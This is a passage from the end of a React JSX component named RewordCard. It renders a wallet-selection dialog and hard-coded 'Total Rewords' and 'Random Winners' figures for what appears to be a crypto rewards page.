                                              </button>
                                            </div>
                                          </CarouselItem>                                          
                                        </CarouselContent>

                                        <SlArrowLeft onClick={handleOtherWalletPrevious} className="absolute top-[5px] left-0 bg-transparent border-none font-bold cursor-pointer" />
                                        <CarouselNext className="hidden" />
                                        <IoClose className="text-[23px] text-[#a794be] absolute top-0 right-0" />
                                      </Carousel>
                                    </DialogDescription>
                                  </DialogHeader>
                                </DialogContent>
                              </Dialog>
                            </div>

                            <div className="flex justify-center mt-4">
                              <div className="flex items-center">
                                <img src={wallet} alt="wallet" className="w-[20px] mr-2" />
                                <Link to="/" className="text-[#D3D2FF80] hover:underline">I use different wallet</Link>
                              </div>
                            </div>
                          </div>
                        </DialogDescription>
                      </DialogHeader>
                    </DialogContent>
                  </Dialog>
                </div>
              </div>

              <div className="py-[30px] flex justify-between items-center px-4 md:px-6">
                <p className="text-[18px] text-[#686b91] capitalize">Total Rewords</p>
                <div className="text-[19px]">
                  <p className="text-transparent bg-clip-text bg-gradient-to-t from-[#414453] from-10% to-[#b0b8da] to-90% font-semibold">9,510,644 B30 ETH</p>
                </div>
              </div>

              <div className="bg-[#1f213a] dark:bg-[#7a8aa062] h-[1px]" />

              <div className="py-[30px] flex justify-between items-center px-4 md:px-6">
                <p className="text-[18px] text-[#686b91] capitalize">Random Winners</p>
                <div className="text-[19px]">
                  <p className="text-transparent bg-clip-text bg-gradient-to-t from-[#414453] from-10% to-[#b0b8da] to-90% font-semibold">353136</p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </Container>
    </div>
  );
};

export default RewordCard;
